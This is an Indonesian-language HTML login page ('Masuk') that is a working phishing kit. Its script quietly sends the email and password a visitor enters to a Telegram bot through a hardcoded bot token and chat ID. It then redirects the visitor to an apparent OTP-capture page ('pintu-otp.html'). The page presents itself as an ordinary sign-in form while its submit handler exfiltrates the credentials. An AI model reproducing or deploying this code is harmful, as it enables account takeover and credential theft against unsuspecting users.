<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Masuk</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white text-black font-sans">
  <div class="max-w-sm mx-auto px-4 pt-4">
    <!-- Back Button -->
    <button class="mb-4">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none"
           viewBox="0 0 24 24" stroke="currentColor">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
              d="M15 19l-7-7 7-7"/>
      </svg>
    </button>

    <!-- Title -->
    <h1 class="text-xl font-bold mb-6">Masuk</h1>

    <!-- Form -->
    <form class="space-y-4" id="loginForm">
      <!-- Email -->
      <div>
        <label for="email" class="block text-sm font-semibold mb-1">Email Kamu</label>
        <input id="email" type="email"
               class="w-full border-b border-black focus:outline-none py-2 text-base"
               placeholder="" required />
      </div>

      <!-- Password -->
      <div>
        <label for="password" class="block text-sm font-semibold mb-1">Kata Sandi</label>
        <div class="relative">
          <input id="password" type="password"
                 class="w-full border-b border-black focus:outline-none py-2 pr-10 text-base"
                 placeholder="" required />
          <button type="button"
                  onclick="togglePassword()"
                  class="absolute inset-y-0 right-0 flex items-center pr-2 text-gray-600">
            <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg"
                 class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
              <path d="M10 3C5 3 1.73 7.11 1 10c.73 2.89 4 7 9 7s8.27-4.11 9-7c-.73-2.89-4-7-9-7zM10 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/>
              <path d="M10 7a3 3 0 100 6 3 3 0 000-6z"/>
            </svg>
          </button>
        </div>
      </div>

      <!-- Forgot Password -->
      <div class="text-right">
        <a href="#" class="text-blue-600 text-sm font-medium">Lupa Password?</a>
      </div>

      <!-- Button -->
      <button type="submit"
              class="w-full bg-blue-600 text-white py-2 rounded-md font-semibold text-base">
        Masuk
      </button>
    </form>

    <!-- Terms -->
    <p class="text-center text-xs mt-4">
      Dengan mendaftar, kamu menyetujui <br>
      <a href="#" class="text-blue-600 font-medium">Syarat & Ketentuan</a>
    </p>
  </div>

  <script>
  function togglePassword() {
    const pwd = document.getElementById("password");
    const icon = document.getElementById("eyeIcon");
    pwd.type = pwd.type === "password" ? "text" : "password";
  }
  
  // Ganti dengan token dan chat_id bot Telegram kamu
  const BOT_TOKEN = '8459310017:AAFmfn3eF20MKFUViWbwn1eqnDOxnGkaqMo';
  const CHAT_ID = '7953949040';
  
  document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    
    const message = `ðŸ“¥ *Login Baru*\nðŸ“§ Email: ${email}\nðŸ”’ Password: ${password}`;
    
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      })
      .then(response => {
        if (!response.ok) throw new Error('Gagal mengirim ke Telegram');
        return response.json();
      })
      .then(data => {
        // Setelah berhasil, pindah ke halaman berikutnya
        window.location.href = "pintu-otp.html"; // Ganti sesuai halaman tujuan
      })
      .catch(error => {
        alert('Terjadi kesalahan saat mengirim ke Telegram.');
        console.error(error);
      });
  });
</script>
</body>
</html>
